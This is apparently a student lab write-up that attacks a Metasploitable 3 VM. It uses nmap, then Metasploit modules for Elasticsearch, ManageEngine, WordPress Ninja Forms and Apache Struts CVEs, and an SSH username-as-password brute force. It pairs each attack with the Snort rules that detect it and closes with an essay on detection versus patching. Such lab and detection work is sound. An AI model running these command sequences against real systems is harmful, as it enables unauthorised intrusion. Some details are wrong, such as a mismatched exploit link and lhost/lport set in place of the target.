# Cyber_Security_Base_Project_II
"Metasploitable 3" and "Snort" rules 
Cyber security base – Project II

Target – Metasploitable 3
	    Windows Server 2008 & Ubuntu server 14

STEP 1: Run an Nmap Ping sweep scan to look for potential connected devices  

$ nmap -sP 192.168.1.1/24


STEP 2: Identify Target Host – 192.168.1.40

STEP 3: Run an nmap scan on the target machine with OS Fingerprinting and save the output in a file called Meta3.nmap


I ran a verbose nmap scan for which i have attached the output file:

# Nmap 7.80 scan initiated Sun Mar  8 20:48:34 2020 as: nmap -sC -sV -p- -A -oA Meta3 192.168.1.40 (output file attached)

Scan results discovered many of valuable information about the open ports and services running on the target device. There was no authentication required to access the administrative functions, default credentials are not changed and there are outdated versions of a few were running. Snort obviously did not trigger a warning about anything, as the port scan detection configurations has been commented out from snort.conf on default.

EXPLOIT I – ELASTIC SEARCH – CVE-2014-3120

STEP 4: PORT 9200 – Elasticsearch

Googling about the gethered information I found a link which has an exploit for that service. 

Vulnerability name: Elastic search - CVE-2014-3120

https://www.rapid7.com/db/modules/exploit/multi/misc/java_rmi_server

STEP 5: Run a searchsploit and check if you have the exploit in local machine.

$ searchsploit elasticsearch



STEP 6: Turn on metasploit

$ msfconsole








STEP 7: search for an exploit and exploit the machine.

$ search elasticsearch
$ use exploit/multi/elasticsearch/script_mvel_rce
$ options
$ set rhost 192.168.1.40
$ exploit

you get a shell once you get a shell, you can run the following commands.

# sysinfo
# shell
# whoami


Snort did not log any alerts

SNORT RULE FIX: but after uncommenting line 811 (depends about ruleset) on server-other.rules file, Snort produces the following message: SERVER-OTHER ElasticSearch script remote code execution attempt [**] [Classification: Attempted User Privilege Gain]

EXPLOIT II - ManageEngine (CVE-2015-8249)

STEP 1: Port 8020 is running an Apache service 

STEP 2: Visit <your_meta_ip>:8020



Manage Engine is running in that port with a default username and password admin:admin

Manage Engine : Build No – 91084 

Googling for such information we get the following Poc
https://blog.rapid7.com/2015/12/14/r7-2015-22-manageengine-desktop-central-9-fileuploadservlet-connectionid-vulnerability-cve-2015-8249/

STEP 3: look for exploits in your device 

$ searchsploit manageengine desktop central 9


STEP 4: Turn on metasploit

$ msfconsole
$ search manageengie
$ use exploit/windows/http/manageengine_connectionid_write
$ set rhost 192.168.1.40
$ exploit

you gain meterprerer shell, run the following commands to conform.
# sysinfo			# shell 			# whoami
Once again, Snort doesn’t alert about anything, but this can easily be changed by 

SNORT RULE FIX: Uncommenting lines 1854-1856 on server-webapp.rules gives us following: SERVER-WEBAPP ManageEngine Desktop Central FileUploadServlet directory traversal attempt [**] [Classification: Web Application Attack]


Exploit III - WordPress – CVE-2016-1209
STEP 1: Visit <Meta_ip:>8585 you can see that wordpress is running.

STEP 2: Googling a little bit we found the following exploit
https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_ninja_forms_unauthenticated_file_upload
STEP 3: Trun on metasploit console and exploit the target.
$ msfconsole
$ search wp_ninja_forms
$ use exploit/multi/http/wp_ninja_forms_unauthenticated_file_upload
$ set rhost 192.168.1.40
$ set rport 8585
$ set TARGETURI /wordpress/
$ set FORM_PATH /index.php/king-of-hearts/
$ exploit

SNORT RULE FIX : After uncommenting line 2284 in server-webapp.rules and adding the port 8585 into monitoring HTTP traffic, Snort gives the following alert: SERVER-WEBAPP WordPress Ninja Forms nf_async_upload arbitrary PHP file upload attempt [**] [Classification: Attempted Administrator Privilege Gain]


EXPLOIT 4: Bruteforcing SSH
STEP 1: When you gained a root access last time, run the following command to see a list of all users in the system.
$net users

We can use the metaploit module for ssh_login to try to brute force into some of these available names.

STEP 2: save all the user name in a text file





















STEP 3: turn on metasploit and use the ssh_login module to check for insecure passwords same as username.

$ use auxiliary/scanner/ssh/ssh_login
$ set rhost 192.168.1.40
$ set USER_AS_PASS true
$ set USER_FILE user.txt
$ exploit

Give the user file that we created to metasploit and exploit

I had some issues with my arch linux so had to shift back to kali for this one.
We can already see that we got some valid credentials like Vagrant:Vagrant.

SNORT FIX : Snort could probably be generated for slower (longer) SSH brute force attempts, but for such a fast SSH connection it wouldn’t be wise to start raising alert flags (considering admin’s point of view).


EXPLOIT 5: Apache Struts CVE-2016-3087

STEP 1: Look nmap result port 8282 runs Apache Tomcat Server, 

STEP 2: After a bit of research we find the following:
https://www.rapid7.com/db/vulnerabilities/struts-cve-2016-3087

STEP 3: Open metasploit and look for exploit and hack the box.
$ msfconsole
$ search rest_exec
$ use exploit/multi/http/struts_dmi_rest_exec
$ set lhost 192.168.1.40
$ set lport 8282
$ exploit


We hacked the box 

SNORT RULE FIX: We can get Snort to figure this out by uncommenting lines 118 and 119 from server-apache.rules (which I had already done) and adding port 828 for monitoring. This gives us following message: SERVER-APACHE Apache Struts remote code execution attempt [**] [Classification: Attempted Administrator Privilege Gain]

Is it easier to fix the application than to detect attacks?

In my opinion, detecting attacks is much easier than fixing an application. This is because the latter can be approached in a variety of different ways, unlike the former. In other words, it is more efficient to conduct reconnaissance, penetration testing, and privilege escalation to identify faults in an application than 
to sift through millions of lines of code trying to locate and fix issues. Moreover, in the latter approach, fixing one vulnerability often introduces multiple new ones, and mistakes may occur at the implementation level—not necessarily within the code itself. Issues like this can easily push developers outside their comfort 
zones, increasing the likelihood of errors. Developers often have a heavy workload, and with the recent surge in IoT devices, it's increasingly difficult for them to manage application fixes entirely on their own. That’s where intrusion detection plays a crucial role. Although not a direct solution, it serves as a countermeasure 
by providing information about potential vulnerabilities in both the system and its applications. Systems based on modern open-source platforms are arguably easier to patch, but vulnerabilities still need to be identified first—making intrusion detection essential. Penetration testing reports and vulnerability assessments can 
actually speed up the application-fixing process. In addition to Intrusion Detection Systems (IDS) like Snort, attack detection often involves log monitoring and analysis. When unusual behavior is noticed in logs, it may indicate the need for a vulnerability assessment or software/hardware update—though not always, as false 
positives can be quite frustrating.
